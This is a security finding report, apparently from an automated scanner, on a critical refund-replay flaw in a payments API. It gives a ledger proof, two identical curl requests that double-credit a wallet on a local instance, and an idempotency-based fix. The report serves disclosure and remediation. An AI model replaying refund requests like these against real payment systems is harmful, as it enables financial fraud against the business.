# [Critical] Refund can be replayed (double credit) on POST /api/v3/refunds
**Severity:** Critical (10.0) — base 8.6 (double_refund); asset criticality 1.5 (+1.0); directly realisable financial loss (+0.8)
**Owner:** payments-svc (#payments-eng)  **Status:** OPEN  **OWASP:** API6:2023 Unrestricted Business Flow  **CWE:** CWE-841


## Business impact
Direct revenue loss / financial integrity break in the refund flow; exploitable by any logged-in agent.

## Proof (oracle: `ledger`)
Refund replayed: wallet rose by 8000.0 for a booking of 4000.0 (expected +4000.0)

```bash
curl -s -X POST 'http://127.0.0.1:8100/api/v3/refunds' -H 'Authorization: Bearer $A1_AGENT_TOKEN' -H 'Content-Type: application/json' -d '{"booking_id": "<CANCELLED_BOOKING>"}'
curl -s -X POST 'http://127.0.0.1:8100/api/v3/refunds' -H 'Authorization: Bearer $A1_AGENT_TOKEN' -H 'Content-Type: application/json' -d '{"booking_id": "<CANCELLED_BOOKING>"}'
```
Evidence audit IDs: 821, 823, 829 — replay with `python -m tripwire replay <audit_id>`


## Suggested fix
Make refunds idempotent: unique refund per booking (DB constraint) + idempotency key; check-and-set inside a transaction.
